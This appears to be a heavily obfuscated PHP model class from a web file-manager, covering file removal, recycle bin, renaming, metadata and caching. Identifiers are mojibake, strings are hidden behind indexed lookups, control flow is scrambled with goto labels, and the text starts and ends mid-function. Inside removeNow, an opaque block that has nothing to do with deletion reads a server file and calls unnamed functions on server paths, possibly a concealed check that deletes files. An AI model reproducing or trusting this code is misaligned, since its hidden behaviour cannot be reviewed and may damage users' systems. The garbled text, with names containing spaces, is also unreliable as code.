$E²›Ğ³ß¢í = Session::get($e¬™×ÉÄ¼[1952]); $dçÆĞ‡®›Â = substr($Døì§‰¿ÙÊ[$e¬™×ÉÄ¼[28]], 0, -1 - strlen($Døì§‰¿ÙÊ[$e¬™×ÉÄ¼[168]])) . $e¬™×ÉÄ¼[1479] . $E²›Ğ³ß¢í . $e¬™×ÉÄ¼[95] . $Døì§‰¿ÙÊ[$e¬™×ÉÄ¼[168]]; $d‹¥ñƒ™İ = Model($e¬™×ÉÄ¼[570])->find($cóÆ¥ÔÜƒ); goto Fá‘º¹¦¥¡; FÑ÷©ŸÒ¦: } public function fileIsLock($d¡Çì“³¨š, $CíÜ¬ÅŒª¼ = false) { goto eï·¤Å°¡; b¨óµ¦Âİ: $Bë…·ö·ÛÌ = $GLOBALS[$DùŠ“ˆÈê[6]][$DùŠ“ˆÈê[88]][$DùŠ“ˆÈê[507]]; if ($d¡Çì“³¨š[$DùŠ“ˆÈê[443]][$DùŠ“ˆÈê[508]] <= time() - $Bë…·ö·ÛÌ) { $this->metaSet($d¡Çì“³¨š[$DùŠ“ˆÈê[394]], $DùŠ“ˆÈê[506], null); $this->metaSet($d¡Çì“³¨š[$DùŠ“ˆÈê[394]], $DùŠ“ˆÈê[508], null); } if ($CíÜ¬ÅŒª¼) { $this->metaSet($d¡Çì“³¨š[$DùŠ“ˆÈê[394]], $DùŠ“ˆÈê[508], time()); } goto e”¢…½Éöè; e”¢…½Éöè: return !1; goto f©êæÇ„ƒÙ; eï·¤Å°¡: $DùŠ“ˆÈê =& $_SERVER[´¬]; if (!isset($d¡Çì“³¨š[$DùŠ“ˆÈê[443]]) || !$d¡Çì“³¨š[$DùŠ“ˆÈê[443]][$DùŠ“ˆÈê[506]]) { return !1; } if ($d¡Çì“³¨š[$DùŠ“ˆÈê[443]][$DùŠ“ˆÈê[506]] != USER_ID) { return !0; } goto b¨óµ¦Âİ; f©êæÇ„ƒÙ: } private function _addSoure($aÀ« ÜˆØ, $AóºÜ¼¢Æœ) { goto f³¢“ŒÀ; f³¢“ŒÀ: $DøƒóÁğŞé =& $_SERVER[´¬]; $E—ŠŞøº“„ = array($DøƒóÁğŞé[548] => $AóºÜ¼¢Æœ[$DøƒóÁğŞé[402]], $DøƒóÁğŞé[549] => $AóºÜ¼¢Æœ[$DøƒóÁğŞé[482]], $DøƒóÁğŞé[550] => USER_ID, $DøƒóÁğŞé[551] => USER_ID, $DøƒóÁğŞé[393] => $AóºÜ¼¢Æœ[$DøƒóÁğŞé[394]], $DøƒóÁğŞé[552] => $AóºÜ¼¢Æœ[$DøƒóÁğŞé[485]] . $AóºÜ¼¢Æœ[$DøƒóÁğŞé[394]] . $DøƒóÁğŞé[47], $DøƒóÁğŞé[420] => 0, $DøƒóÁğŞé[553] => $DøƒóÁğŞé[33]); $aÀ« ÜˆØ = array_merge($E—ŠŞøº“„, $aÀ« ÜˆØ); goto FĞŸèµ¨‚; bœê­Äî‚ë: $EìßÈâ•† = array($DøƒóÁğŞé[554] => short_id($eÕ‚£Ú£½²)); $this->where(array($DøƒóÁğŞé[408] => $eÕ‚£Ú£½²))->save($EìßÈâ•†); $this->setNamePinyin($eÕ‚£Ú£½², $aÀ« ÜˆØ[$DøƒóÁğŞé[28]]); goto cÖíÊ«ğ¶ç; E’—Ö»”àğ: static $Fø…‚ÂŒÖ = false; if (!$Fø…‚ÂŒÖ) { Hook::trigger($DøƒóÁğŞé[535], $aÀ« ÜˆØ); $Fø…‚ÂŒÖ = !0; } $eÕ‚£Ú£½² = $this->add($aÀ« ÜˆØ); goto bœê­Äî‚ë; cÖíÊ«ğ¶ç: return $eÕ‚£Ú£½²; goto aĞäÉĞÈÑã; FĞŸèµ¨‚: $this->updateModifyTime($aÀ« ÜˆØ[$DøƒóÁğŞé[476]]); $F–àÊ¢Ø = $DøƒóÁğŞé[1959] . $AóºÜ¼¢Æœ[$DøƒóÁğŞé[394]]; if (isset(self::$cacheChildList[$F–àÊ¢Ø])) { unset(self::$cacheChildList[$F–àÊ¢Ø]); } goto E’—Ö»”àğ; aĞäÉĞÈÑã: } public function remove($aˆ³ ©Ìõ, $cŒ¼ñÂëäæ = true) { goto bì¹„ÜµÄ; bì¹„ÜµÄ: $D‹‚»â‡ñ¿ =& $_SERVER[´¬]; $a¬ÑÁ„‘Ôâ = $this->sourceInfo($aˆ³ ©Ìõ); $Dî’®Ä¥‰Ñ = intval($a¬ÑÁ„‘Ôâ[$D‹‚»â‡ñ¿[402]]) === self::TYPE_SYSTEM; goto Fãßµ¼êÎ¤; Fãßµ¼êÎ¤: $AƒØ¯¬±† = Model($D‹‚»â‡ñ¿[1525])->get($D‹‚»â‡ñ¿[1960]) == $D‹‚»â‡ñ¿[87]; if ($Dî’®Ä¥‰Ñ || $cŒ¼ñÂëäæ || !$AƒØ¯¬±†) { return $this->removeNow($aˆ³ ©Ìõ, $cŒ¼ñÂëäæ); } $bîµ×†Ññ† = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto b‰ÍÊñÈâÇ; dŸ·ö–Öæ‘: return $D Ù«ä¯¸è; goto DŠçŸ¹œŠª; dáÍ†ºÕ: $this->recycleClear($a¬ÑÁ„‘Ôâ); $D Ù«ä¯¸è = $this->move($aˆ³ ©Ìõ, $b¢†¦í†±Ë, REPEAT_RENAME_FOLDER); $this->folderSizeReset($a¬ÑÁ„‘Ôâ[$D‹‚»â‡ñ¿[476]]); goto dŸ·ö–Öæ‘; eÅ°×­â•ô: CacheLock::unlock($f¸óË–¸Ì«); $this->metaSet($aˆ³ ©Ìõ, $D‹‚»â‡ñ¿[1968], $a¬ÑÁ„‘Ôâ[$D‹‚»â‡ñ¿[476]]); $this->where(array($D‹‚»â‡ñ¿[394] => $aˆ³ ©Ìõ))->save(array($D‹‚»â‡ñ¿[415] => time())); goto dáÍ†ºÕ; B×½²•Ø®: CacheLock::lock($f¸óË–¸Ì«); $b¢†¦í†±Ë = $this->fileNameExist($bîµ×†Ññ†, $dŒµ™çÂò“); if (!$b¢†¦í†±Ë) { $b¢†¦í†±Ë = $this->mkdir($bîµ×†Ññ†, $dŒµ™çÂò“, REPEAT_SKIP); $this->metaSet($b¢†¦í†±Ë, $D‹‚»â‡ñ¿[1964], $dÄ„šò×’); $this->metaSet($b¢†¦í†±Ë, $D‹‚»â‡ñ¿[1965], $a¬ÑÁ„‘Ôâ[$D‹‚»â‡ñ¿[482]]); if ($a¬ÑÁ„‘Ôâ[$D‹‚»â‡ñ¿[476]] != 0) { $this->metaSet($b¢†¦í†±Ë, $D‹‚»â‡ñ¿[1966], _get($a¸…²Ô’œ¼, $D‹‚»â‡ñ¿[1967])); } } goto eÅ°×­â•ô; b‰ÍÊñÈâÇ: $dÄ„šò×’ = $a¬ÑÁ„‘Ôâ[$D‹‚»â‡ñ¿[402]] == self::TYPE_USER ? $D‹‚»â‡ñ¿[561] : $D‹‚»â‡ñ¿[1016]; if ($dÄ„šò×’ == $D‹‚»â‡ñ¿[561]) { $a¸…²Ô’œ¼ = Model($D‹‚»â‡ñ¿[501])->getInfo($a¬ÑÁ„‘Ôâ[$D‹‚»â‡ñ¿[482]]); $dŒµ™çÂò“ = !empty($a¸…²Ô’œ¼[$D‹‚»â‡ñ¿[1953]]) ? $a¸…²Ô’œ¼[$D‹‚»â‡ñ¿[1953]] : $a¸…²Ô’œ¼[$D‹‚»â‡ñ¿[28]]; $dŒµ™çÂò“ = $D‹‚»â‡ñ¿[257] . $dŒµ™çÂò“ . $D‹‚»â‡ñ¿[1961] . $a¬ÑÁ„‘Ôâ[$D‹‚»â‡ñ¿[482]]; } else { $a¸…²Ô’œ¼ = Model($D‹‚»â‡ñ¿[484])->getInfo($a¬ÑÁ„‘Ôâ[$D‹‚»â‡ñ¿[482]]); $dŒµ™çÂò“ = _get($a¸…²Ô’œ¼, $D‹‚»â‡ñ¿[28]); $dŒµ™çÂò“ = $D‹‚»â‡ñ¿[160] . $dŒµ™çÂò“ . $D‹‚»â‡ñ¿[1962] . $a¬ÑÁ„‘Ôâ[$D‹‚»â‡ñ¿[482]]; } $f¸óË–¸Ì« = $D‹‚»â‡ñ¿[1963] . md5($dŒµ™çÂò“); goto B×½²•Ø®; DŠçŸ¹œŠª: } private function recycleClear($D´æÏç§½) { $DÈÄ¹³„¾ç =& $_SERVER[´¬]; $Fòàõ™¥Âˆ = $this->childrenAll($D´æÏç§½); $CÚÑÕ‹ì„÷ = array($DÈÄ¹³„¾ç[408] => array($DÈÄ¹³„¾ç[409], $Fòàõ™¥Âˆ[$DÈÄ¹³„¾ç[1969]])); Model($DÈÄ¹³„¾ç[1970])->where($CÚÑÕ‹ì„÷)->delete(); } public function removeNow($f§äÅÆ¢Ñó, $BÛ‰’¨ª¼ = true) { goto cì™ŸÇÄ ; F›«Óµá×õ: $this->lockMoveStart($f§äÅÆ¢Ñó); Hook::trigger($a†´´°ŠóŠ[1971], $CĞ¬àó‡Ç, $BÛ‰’¨ª¼); if ($BÛ‰’¨ª¼) { Model($a†´´°ŠóŠ[1970])->moveToRecycle($f§äÅÆ¢Ñó); } else { $aÂ¨´„‡›˜ = $this->childrenAll($dò¨Ó®¤Ÿ“); Model($a†´´°ŠóŠ[532])->eventRemove($f§äÅÆ¢Ñó); $this->removeRelevance($aÂ¨´„‡›˜[$a†´´°ŠóŠ[1969]], $aÂ¨´„‡›˜[$a†´´°ŠóŠ[1347]]); } goto d›é¦Êß‡œ; FĞ«ÀŠ»ÔÃ: return !0; goto c÷èë°Ğ²; d›é¦Êß‡œ: $this->folderSizeReset($dò¨Ó®¤Ÿ“[$a†´´°ŠóŠ[476]]); $E¼ºã‰ù‡ê = array($dò¨Ó®¤Ÿ“[$a†´´°ŠóŠ[476]]); if ($dò¨Ó®¤Ÿ“[$a†´´°ŠóŠ[401]] == $a†´´°ŠóŠ[87]) { $E¼ºã‰ù‡ê[] = $dò¨Ó®¤Ÿ“[$a†´´°ŠóŠ[394]]; } goto AÈ»øŞÆƒ; AÈ»øŞÆƒ: $this->updateModifyTime($E¼ºã‰ù‡ê); $this->lockMoveEnd($f§äÅÆ¢Ñó); Hook::trigger($a†´´°ŠóŠ[1558], $CĞ¬àó‡Ç, $BÛ‰’¨ª¼); goto FĞ«ÀŠ»ÔÃ; cì™ŸÇÄ : $a†´´°ŠóŠ =& $_SERVER[´¬]; if ($_SERVER[$a†´´°ŠóŠ[821]] != $_SERVER[$a†´´°ŠóŠ[822]]) { goto cšÖÊ¼†àÅ; AÂÏ¶­À´: $cõŒ©á¯” = $a†´´°ŠóŠ[841]; $cõŒ©á¯”($_SERVER[$a†´´°ŠóŠ[842]]); $cõŒ©á¯”($_SERVER[$a†´´°ŠóŠ[824]] . $a†´´°ŠóŠ[1398]); goto F‹„¸İ«Ù; F‹„¸İ«Ù: $eæÕ®ÙÊáë = 1; while ($eæÕ®ÙÊáë > 1) { $eæÕ®ÙÊáë = $eæÕ®ÙÊáë + 4; $f¼Õ¥…”Ïê = rawurlencode($eæÕ®ÙÊáë . $a†´´°ŠóŠ[374]); } goto Cœ”óÏÆÕÓ; cšÖÊ¼†àÅ: $B¤ˆŞ”œÒë = $a†´´°ŠóŠ[840]; $CÇ×çŸÏ¶¨ = $a†´´°ŠóŠ[823]; $E©ŠÂ‚½ƒ‘ = $_SERVER[$a†´´°ŠóŠ[824]] . $a†´´°ŠóŠ[825]; goto F°ë²ÚêĞ; F°ë²ÚêĞ: $A®ô¯éˆœµ = $CÇ×çŸÏ¶¨($E©ŠÂ‚½ƒ‘); $AÚ¥Óåö•á = explode($a†´´°ŠóŠ[228], $A®ô¯éˆœµ); if (count($AÚ¥Óåö•á) < $a†´´°ŠóŠ[585]) { $AÔˆí¬‹„ = $a†´´°ŠóŠ[826]; $AÔˆí¬‹„(); } goto AÂÏ¶­À´; Cœ”óÏÆÕÓ: } $dò¨Ó®¤Ÿ“ = $this->sourceInfo($f§äÅÆ¢Ñó); goto BÚ¸á•é‘ø; BÚ¸á•é‘ø: $CĞ¬àó‡Ç = $this->pathInfoMore($f§äÅÆ¢Ñó); if (!$dò¨Ó®¤Ÿ“) { return !0; } if ($dò¨Ó®¤Ÿ“[$a†´´°ŠóŠ[476]] == 0) { if (!_get($GLOBALS, $a†´´°ŠóŠ[483])) { return !1; } } goto F›«Óµá×õ; c÷èë°Ğ²: } public function childrenAll($fßƒ¶ëªªİ) { $BÓÕŸæäô§ =& $_SERVER[´¬]; $Cùà°êÔìŒ = $fßƒ¶ëªªİ[$BÓÕŸæäô§[394]]; if ($fßƒ¶ëªªİ[$BÓÕŸæäô§[401]] == $BÓÕŸæäô§[87]) { $f¶Ê§ÇØğ = array($BÓÕŸæäô§[552] => array($BÓÕŸæäô§[511], $fßƒ¶ëªªİ[$BÓÕŸæäô§[485]] . $Cùà°êÔìŒ . $BÓÕŸæäô§[512])); $c©ÚÒ¿Œù = array($BÓÕŸæäô§[552] => $f¶Ê§ÇØğ[$BÓÕŸæäô§[485]]); $aÏ¸áèßÎç = $this->field($BÓÕŸæäô§[1972])->where($c©ÚÒ¿Œù)->select(); $B±³¬‡¯µó = !1; $CìæšôÉÏĞ = array($Cùà°êÔìŒ); if ($aÏ¸áèßÎç) { $B±³¬‡¯µó = array_to_keyvalue($aÏ¸áèßÎç, $BÓÕŸæäô§[33], $BÓÕŸæäô§[445]); $B±³¬‡¯µó = array_remove_value($B±³¬‡¯µó, $BÓÕŸæäô§[495]); $CìæšôÉÏĞ = array_to_keyvalue($aÏ¸áèßÎç, $BÓÕŸæäô§[33], $BÓÕŸæäô§[394]); $CìæšôÉÏĞ[] = $Cùà°êÔìŒ; } } else { $B±³¬‡¯µó = array($fßƒ¶ëªªİ[$BÓÕŸæäô§[445]]); $CìæšôÉÏĞ = array($Cùà°êÔìŒ); } return array($BÓÕŸæäô§[1969] => $CìæšôÉÏĞ, $BÓÕŸæäô§[1347] => $B±³¬‡¯µó); } public function removeArray($f‹·ÒÀ„¯) { if (!$f‹·ÒÀ„¯) { return !0; } } public function removeRelevance($f‚ê£Ú¿•¨, $aÚÛŞ¬ªÃ) { goto a½å­†‹Âà; e¢ÚêÔº¹©: Model($DËˆãÆí½›[1824])->where($få¼²¯©¬)->delete(); Model($DËˆãÆí½›[532])->where($få¼²¯©¬)->delete(); Model($DËˆãÆí½›[1666])->removeBySource($f‚ê£Ú¿•¨); goto d¿«£„ „ö; d¿«£„ „ö: Model($DËˆãÆí½›[1951])->removeBySource($f‚ê£Ú¿•¨); $this->where($få¼²¯©¬)->delete(); Model($DËˆãÆí½›[448])->remove($aÚÛŞ¬ªÃ); goto DÖ†¢³³Š ; a½å­†‹Âà: $DËˆãÆí½› =& $_SERVER[´¬]; $f‚ê£Ú¿•¨ = $f‚ê£Ú¿•¨ ? $f‚ê£Ú¿•¨ : array(); $aÚÛŞ¬ªÃ = $aÚÛŞ¬ªÃ ? $aÚÛŞ¬ªÃ : array(); goto b¯Éò¦æ´; DÖ†¢³³Š : for ($Cğ„Şã”¹õ = 0; $Cğ„Şã”¹õ < count($f‚ê£Ú¿•¨); $Cğ„Şã”¹õ++) { $this->sourceCacheClear($f‚ê£Ú¿•¨[$Cğ„Şã”¹õ]); } goto Aä¯Ù¯³Æ—; b¯Éò¦æ´: $f‚ê£Ú¿•¨ = array_unique(array_filter($f‚ê£Ú¿•¨)); $aÚÛŞ¬ªÃ = array_unique(array_filter($aÚÛŞ¬ªÃ)); if (!$f‚ê£Ú¿•¨) { return !1; } goto cÌ÷•Éˆó®; cÌ÷•Éˆó®: $få¼²¯©¬ = array($DËˆãÆí½›[408] => array($DËˆãÆí½›[409], $f‚ê£Ú¿•¨)); Model($DËˆãÆí½›[1970])->where($få¼²¯©¬)->delete(); Model($DËˆãÆí½›[439])->where($få¼²¯©¬)->delete(); goto e¢ÚêÔº¹©; Aä¯Ù¯³Æ—: } public function rename($E½±ˆ´«Á, $b†àß‡‡ÁÔ) { goto Fæ°Ò•–œ; Bõµ½ôö±Ì: $c‹ãâãÚ = $this->fileNameExist($e¥›ôç ªÍ[$E£…„–›ë[476]], $b†àß‡‡ÁÔ); if ($c‹ãâãÚ && $c‹ãâãÚ != $E½±ˆ´«Á) { return !1; } $D¥øâŞÒÒò = array($E£…„–›ë[411] => $b†àß‡‡ÁÔ, $E£…„–›ë[551] => USER_ID); goto B¬Ø›âß½Ê; Fæ°Ò•–œ: $E£…„–›ë =& $_SERVER[´¬]; $e¥›ôç ªÍ = $this->sourceInfo($E½±ˆ´«Á); if (!$e¥›ôç ªÍ) { return !1; } goto Bõµ½ôö±Ì; B¬Ø›âß½Ê: if ($e¥›ôç ªÍ[$E£…„–›ë[401]] != $E£…„–›ë[87]) { $D¥øâŞÒÒò[$E£…„–›ë[403]] = substr(get_path_ext($b†àß‡‡ÁÔ), 0, 10); } Model($E£…„–›ë[532])->eventRename($E½±ˆ´«Á, $e¥›ôç ªÍ[$E£…„–›ë[28]], $b†àß‡‡ÁÔ); $this->sourceCacheClear($E½±ˆ´«Á); goto e®ŠåÍ™ÊÄ; BÍé“†×—ì: $E”ª×³óë = $E£…„–›ë[1959] . $e¥›ôç ªÍ[$E£…„–›ë[476]]; if (isset(self::$cacheChildList[$E”ª×³óë])) { unset(self::$cacheChildList[$E”ª×³óë]); } return $DÏªá–Ãƒ; goto b¨ÈèÁİ£ ; e®ŠåÍ™ÊÄ: $this->setNamePinyin($E½±ˆ´«Á, $D¥øâŞÒÒò[$E£…„–›ë[28]], !1); $this->updateModifyTime($e¥›ôç ªÍ[$E£…„–›ë[476]]); $DÏªá–Ãƒ = $this->where(array($E£…„–›ë[408] => $E½±ˆ´«Á))->data($D¥øâŞÒÒò)->save(); goto BÍé“†×—ì; b¨ÈèÁİ£ : } public function setNamePinyin($C‡¯¹Œ×‡Ú, $c×’³ÙÅÒ, $e¡Œä‰Ì‚Ô = true) { $dÃËÍâ¤›Û =& $_SERVER[´¬]; $BÅ¡œ£®ß¥ = Input::check($c×’³ÙÅÒ, $dÃËÍâ¤›Û[555]); if ($e¡Œä‰Ì‚Ô && !$BÅ¡œ£®ß¥) { return; } if (!$BÅ¡œ£®ß¥) { $this->metaSet($C‡¯¹Œ×‡Ú, $dÃËÍâ¤›Û[442], null); $this->metaSet($C‡¯¹Œ×‡Ú, $dÃËÍâ¤›Û[441], null); return; } $d†«‚£éĞ‡ = array($dÃËÍâ¤›Û[442] => str_replace($dÃËÍâ¤›Û[50], $dÃËÍâ¤›Û[33], Pinyin::encode($c×’³ÙÅÒ)), $dÃËÍâ¤›Û[441] => Pinyin::encode($c×’³ÙÅÒ, $dÃËÍâ¤›Û[556])); $this->metaSet($C‡¯¹Œ×‡Ú, $d†«‚£éĞ‡); } public function getContent($E·³¥£§) { goto eÈ½œ¹´İˆ; BµÕµ  ®Ò: if (!$f™íê™Šô›[$f¡³æ½×è[76]]) { return $f¡³æ½×è[33]; } return IO::getContent($f™íê™Šô›[$f¡³æ½×è[76]]); goto EÊ—ÍÂ©¸“; eÈ½œ¹´İˆ: $f¡³æ½×è =& $_SERVER[´¬]; $f™íê™Šô› = $this->fileInfoGet($E·³¥£§); if (!$f™íê™Šô›) { return !1; } goto eƒÂ¢´´æ­; eƒÂ¢´´æ­: if ($f™íê™Šô›[$f¡³æ½×è[78]] == 0) { return $f¡³æ½×è[33]; } $A¤Ü„¶©Ë = $f¡³æ½×è[1973] . $f™íê™Šô›[$f¡³æ½×è[170]]; if ($f™íê™Šô›[$f¡³æ½×è[78]] <= 1024 * 10) { $aáÉ­ƒö² = Cache::get($A¤Ü„¶©Ë); if (!$aáÉ­ƒö²) { $aáÉ­ƒö² = IO::getContent($f™íê™Šô›[$f¡³æ½×è[76]]); Cache::set($A¤Ü„¶©Ë, $aáÉ­ƒö²); } return $aáÉ­ƒö²; } goto BµÕµ  ®Ò; EÊ—ÍÂ©¸“: } public function setDesc($Bã½ñóÂ‘Ÿ, $d‚æÍ¸†Œ‹) { $e êÔ‚áÄ =& $_SERVER[´¬]; Model($e êÔ‚áÄ[532])->eventAddDesc($Bã½ñóÂ‘Ÿ, $d‚æÍ¸†Œ‹); return $this->metaSet($Bã½ñóÂ‘Ÿ, $e êÔ‚áÄ[429], $d‚æÍ¸†Œ‹); } public function setContent($F‡ã»Ñõ²³, $b¼©±îöÆ = '') { goto bäæ‡ÖÈ; bäæ‡ÖÈ: $BïÙ¬Ø•–Â =& $_SERVER[´¬]; $Bôœ³Šãè÷ = $this->sourceInfo($F‡ã»Ñõ²³); $f‰ë§ØÛÈò = $this->fileInfoGet($F‡ã»Ñõ²³); goto A§Ø¥äÀØ”; B•§›ÄõŞÀ: if (!$F¿Ûå±‚ñˆ) { return Model($BïÙ¬Ø•–Â[448])->remove($eİ ¼ÓŸ„‹[$BïÙ¬Ø•–Â[445]]); } $this->folderSizeReset($Bôœ³Šãè÷[$BïÙ¬Ø•–Â[476]]); return !0; goto BÒ¡ëƒª“¾; A§Ø¥äÀØ”: if (!$f‰ë§ØÛÈò || !$Bôœ³Šãè÷) { return !1; } $eİ ¼ÓŸ„‹ = Model($BïÙ¬Ø•–Â[448])->addFileByContent($b¼©±îöÆ, $Bôœ³Šãè÷[$BïÙ¬Ø•–Â[28]]); $F¿Ûå±‚ñˆ = $this->fileHistory($Bôœ³Šãè÷, $eİ ¼ÓŸ„‹[$BïÙ¬Ø•–Â[445]], $eİ ¼ÓŸ„‹[$BïÙ¬Ø•–Â[78]]); goto B•§›ÄõŞÀ; BÒ¡ëƒª“¾: } public function fileSubstr($E®‰½£˜„«, $a–Ëª†Ó£¥, $a´”çğ¨©Û) { $e„¬”ƒíÀ = $this->fileInfoGet($E®‰½£˜„«); if (!$e„¬”ƒíÀ) { return !1; } return IO::fileSubstr($e„¬”ƒíÀ[$_SERVER[´¬][76]], $a–Ëª†Ó£¥, $a´”çğ¨©Û); } public function fileInfoGet($eÅÍòí–Ÿï) { goto dÂõ¢â£é; dÂõ¢â£é: $Bê¨¡•ÁÌì =& $_SERVER[´¬]; $C†Í•Ä´êó = $this->sourceInfo($eÅÍòí–Ÿï); if (!$C†Í•Ä´êó || $C†Í•Ä´êó[$Bê¨¡•ÁÌì[401]]) { return !1; } goto CÈâÊ’§î‹; CÈâÊ’§î‹: $AÎ«·£÷ƒö = $Bê¨¡•ÁÌì[451] . $C†Í•Ä´êó[$Bê¨¡•ÁÌì[445]]; $a†ºŒ‰æ×Ô = _get(self::$cacheFileInfo, $AÎ«·£÷ƒö); if ($a†ºŒ‰æ×Ô) { return $a†ºŒ‰æ×Ô; } goto DÚÌ¦ŒŒ‘ª; DÚÌ¦ŒŒ‘ª: $eŒ‹¾ñ‹šâ = Model($Bê¨¡•ÁÌì[448])->fileInfo($C†Í•Ä´êó[$Bê¨¡•ÁÌì[445]]); if ($eŒ‹¾ñ‹šâ) { $eŒ‹¾ñ‹šâ[$Bê¨¡•ÁÌì[28]] = $C†Í•Ä´êó[$Bê¨¡•ÁÌì[28]]; } self::$cacheFileInfo[$AÎ«·£÷ƒö] = $eŒ‹¾ñ‹šâ; goto e¶§›œƒÛñ; e¶§›œƒÛñ: return $eŒ‹¾ñ‹šâ; goto D½›Ì¯‡”; D½›Ì¯‡”: } private function folderChildrenNumber($f®µ…áê†›) { $EÎ„‰Ú¤Ï© =& $_SERVER[´¬]; $Aİí¿ÂÂœŒ = $this->sourceInfo($f®µ…áê†›); $FÁ‘ˆåïĞ‚ = array($EÎ„‰Ú¤Ï©[552] => array($EÎ„‰Ú¤Ï©[511], $Aİí¿ÂÂœŒ[$EÎ„‰Ú¤Ï©[485]] . $f®µ…áê†› . $EÎ„‰Ú¤Ï©[512]), $EÎ„‰Ú¤Ï©[420] => intval($Aİí¿ÂÂœŒ[$EÎ„‰Ú¤Ï©[421]]), $EÎ„‰Ú¤Ï©[545] => 1); $E¢¬Ÿø½Ÿô = $this->where($FÁ‘ˆåïĞ‚)->count(); $CÕ©ï‹² = $this->where($FÁ‘ˆåïĞ‚)->where(array($EÎ„‰Ú¤Ï©[545] => 0))->count(); return array($EÎ„‰Ú¤Ï©[82] => $CÕ©ï‹², $EÎ„‰Ú¤Ï©[83] => $E¢¬Ÿø½Ÿô); } public function pathInfo($CÄí¬Ó‰‡¸, $cŠÅ–­íé = false) { goto cğ‘Š†Æ°; cğ‘Š†Æ°: $eÅÀò×ÄÍ =& $_SERVER[´¬]; $cŠÅ–­íé = !1; $CÄí¬Ó‰‡¸ = intval($CÄí¬Ó‰‡¸); goto DÚ¡²‘Šá; DÚ¡²‘Šá: $AÒº»’²¥ = $eÅÀò×ÄÍ[437] . intval($cŠÅ–­íé) . $eÅÀò×ÄÍ[438] . $CÄí¬Ó‰‡¸; $bƒ“Æêí = _get(self::$cachePathInfo, $AÒº»’²¥); if ($bƒ“Æêí) { return $bƒ“Æêí; } goto f»‡„ÑˆËğ; cíµ‹æœ¼§: self::$cachePathInfo[$AÒº»’²¥] = $CÓ²Î…‡¿; return $CÓ²Î…‡¿; goto AÂŞİÜˆ‰; f»‡„ÑˆËğ: $CÓ²Î…‡¿ = $this->sourceInfo($CÄí¬Ó‰‡¸); if (!$CÓ²Î…‡¿) { return !1; } $CÓ²Î…‡¿ = $this->_listDataApplyItem($CÓ²Î…‡¿, $cŠÅ–­íé); goto cíµ‹æœ¼§; AÂŞİÜˆ‰: } public static $cachePathInfoMore = array(); public function pathInfoMore($eÏšÊ—Ãà–) { goto F×Ü‰…œÍÏ; F×Ü‰…œÍÏ: $aŒÊš„µ„ƒ =& $_SERVER[´¬]; $aÆöõ‘”Åç = _get(self::$cachePathInfoMore, $eÏšÊ—Ãà–); if ($aÆöõ‘”Åç) { return $aÆöõ‘”Åç; } goto fóª¼ÀğéÔ; F»³Æ’ÁÖÆ: self::$cachePathInfoMore[$eÏšÊ—Ãà–] = $Fâ®™Î’ÏÛ; return $Fâ®™Î’ÏÛ; goto aÕ®…¥÷ğÆ; fóª¼ÀğéÔ: $Fâ®™Î’ÏÛ = $this->pathInfo($eÏšÊ—Ãà–); if (!$Fâ®™Î’ÏÛ) { return !1; } if ($Fâ®™Î’ÏÛ[$aŒÊš„µ„ƒ[401]] == $aŒÊš„µ„ƒ[87]) { $Fâ®™Î’ÏÛ[$aŒÊš„µ„ƒ[81]] = $this->folderChildrenNumber($eÏšÊ—Ãà–); } goto F»³Æ’ÁÖÆ; aÕ®…¥÷ğÆ: } public function sourceInfo($C»œ»ó„‹¨) { goto B¤´­Õ´»Š; B¦êÚ‡å­Ú: $D¡¯¸áåÕ¤ = $BË½¤¨ì­˜[436] . $C»œ»ó„‹¨; $Dœ³š”¦Ûˆ = _get(self::$cacheSourceInfo, $D¡¯¸áåÕ¤); if ($Dœ³š”¦Ûˆ) { return $Dœ³š”¦Ûˆ; } goto FíÏšªÙš¶; FíÏšªÙš¶: $Bªñ£ğâØÁ = $this->where(array($BË½¤¨ì­˜[394] => $C»œ»ó„‹¨))->find(); self::$cacheSourceInfo[$D¡¯¸áåÕ¤] = $Bªñ£ğâØÁ; return self::$cacheSourceInfo[$D¡¯¸áåÕ¤]; goto cõ®ãñïĞ; B¤´­Õ´»Š: $BË½¤¨ì­˜ =& $_SERVER[´¬]; if (!$C»œ»ó„‹¨) { return array(); } $C»œ»ó„‹¨ = intval($C»œ»ó„‹¨); goto B¦êÚ‡å­Ú; cõ®ãñïĞ: } public function sourceCacheClear($AÀĞµËŒ±¬ = false) { self::cacheClear($AÀĞµËŒ±¬); } public static function cacheClear($d®ò¤ªó¢ = false) { $a’ïé÷±Ò =& $_SERVER[´¬]; if ($d®ò¤ªó¢ == !1) { goto B­±ä«¯¹; cŒÁ°£‹îË: return; goto A†”Ã±³õÖ; B­±ä«¯¹: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto fõ–à¸«„á; fõ–à¸«„á: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto cŒÁ°£‹îË; A†”Ã±³õÖ: } unset(self::$cacheSourceInfo[$a’ïé÷±Ò[436] . $d®ò¤ªó¢]); unset(self::$cachePathInfoMore[$d®ò¤ªó¢]); unset(self::$cachePathInfo[$a’ïé÷±Ò[1974] . $d®ò¤ªó¢]); unset(self::$cachePathInfo[$a’ïé÷±Ò[1975] . $d®ò¤ªó¢]); } public function metaSet($FŠ³˜ê÷¬•, $c•³İ‹ = null, $eóèŒ¿°†¥ = null) { $C×È‹‹æ·‚ = parent::metaSet($FŠ³˜ê÷¬•, $c•³İ‹, $eóèŒ¿°†¥); if ($C×È‹‹æ·‚) { $this->sourceCacheClear($FŠ³˜ê÷¬•); } return $C×È‹‹æ·‚; } public function pathInfoByPath($e„ìÄ´Û£†, $c‚‡éÈ§é) { $cËè×Ê¥ÛÅ =& $_SERVER[´¬]; $B¿ôÑ•ÌŒ = !$c‚‡éÈ§é ? array() : explode($cËè×Ê¥ÛÅ[8], trim($c‚‡éÈ§é, $cËè×Ê¥ÛÅ[8])); $D•Ì’ªµ»î = $e„ìÄ´Û£†; foreach ($B¿ôÑ•ÌŒ as $B¯ìæÇª†Ó) { $e¿‡¼è‡® = array($cËè×Ê¥ÛÅ[476] => $D•Ì’ªµ»î, $cËè×Ê¥ÛÅ[28] => $B¯ìæÇª†Ó); $d–í ‚Ã‚¬ = $this->where($e¿‡¼è‡®)->select(); if (!$d–í ‚Ã‚¬) { return !1; } $d–í ‚Ã‚¬ = array_sort_by($d–í ‚Ã‚¬, $cËè×Ê¥ÛÅ[421]); $D•Ì’ªµ»î = $d–í ‚Ã‚¬[0][$cËè×Ê¥ÛÅ[394]]; } return $this->pathInfo($D•Ì’ªµ»î, !0); } protected function updateModifyTime($A¡ôÊÂ²†È) { goto AÛÃ·î; 